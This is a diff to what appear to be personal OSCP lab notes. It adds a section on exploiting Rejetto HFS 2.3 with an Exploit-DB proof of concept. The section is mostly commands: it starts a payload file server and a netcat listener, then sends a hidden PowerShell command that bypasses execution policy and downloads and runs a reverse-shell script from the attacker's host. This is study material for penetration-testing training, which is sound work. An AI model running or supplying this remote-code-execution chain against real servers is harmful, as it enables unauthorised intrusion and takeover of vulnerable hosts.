@@ -88,6 +88,30 @@ See [[09. Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.
 
 #### Tags: #PythonHttpServer
 
+## HFS command delivery and PowerShell staging
+
+When Rejetto HFS 2.3 is identified, use the reviewed Exploit-DB proof of concept and keep the payload server, HFS service, and callback ports distinct.
+
+```bash
+searchsploit "Rejetto HttpFileServer 2.3"
+
+searchsploit -x 49125
+
+cp /usr/share/exploitdb/exploits/windows/webapps/49125.py "$BoxDir/exploits/49125.py"
+
+python3 -m py_compile "$BoxDir/exploits/49125.py"
+
+python3 -m http.server "$TransferPort" --directory "$BoxDir/www"
+
+nc -lvnp "$CallbackPort"
+
+HfsCommand="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/shell.ps1')\""
+
+python3 "$BoxDir/exploits/49125.py" "$BoxIP" "$WebPort" "$HfsCommand"
+```
+
+The HFS proof of concept prints the encoded request, not the target command output. Use the file-server access log and the callback identity as separate evidence. See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]].
+
 ---
 
 ## **Outstanding**
